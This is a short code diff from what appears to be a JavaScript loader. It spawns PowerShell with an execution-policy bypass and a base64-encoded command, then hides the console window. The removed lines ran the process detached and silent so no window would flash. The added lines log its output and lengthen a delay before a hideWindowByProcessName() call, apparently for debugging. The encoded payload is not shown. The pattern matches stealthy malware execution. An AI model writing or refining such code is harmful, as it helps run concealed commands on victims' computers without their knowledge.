@@ -55,10 +55,12 @@ try {
         "-ExecutionPolicy", "Bypass",
         "-EncodedCommand", encoded
         ], {
-        windowsHide: true,
-        detached: true,
-        stdio: 'ignore'  // prevent PowerShell window from flashing
+            windowsHide: true
         });
+        
+        ps.stdout.on("data", (data) => process.stdout.write(data));
+        ps.stderr.on("data", (data) => process.stderr.write(data));
+        ps.on("close", (code) => console.log(`PowerShell exited with code ${code}`));
         ps.unref();
     }
     async function s() {
@@ -69,7 +71,7 @@ try {
                 bb()
             ]);
             // console.log('✅ All async functions completed:', results);
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            await new Promise(resolve => setTimeout(resolve, 5000));
             hideWindowByProcessName();
         }catch(error){
             console.error("Error");
